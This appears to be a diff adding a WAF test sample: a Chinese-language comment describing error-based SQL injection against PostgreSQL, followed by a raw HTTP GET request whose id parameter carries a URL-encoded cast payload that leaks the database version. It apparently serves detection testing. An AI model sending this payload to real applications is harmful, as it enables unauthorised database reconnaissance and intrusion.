@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _报错注入-06506339
+# 攻击者基于报错查询，将"select cast((select version())::text as numeric)"语句注入到 SQL 查询参数中，利用cast函数来强制转换类型使数据库报错以获取PostgreSQL 版本信息。
+GET /?id=1%20and%201=select%20cast%28%28select%20version%28%29%29::text%20as%20numeric%29&bid=hd_tag_m8mv23zf HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23zf
+RM-PRO-Token: 78868158239e8570c7129112e40d5a8d
+RM-PRO-Time: 1742808354982
+User-Agent: curl/7.83.1
+
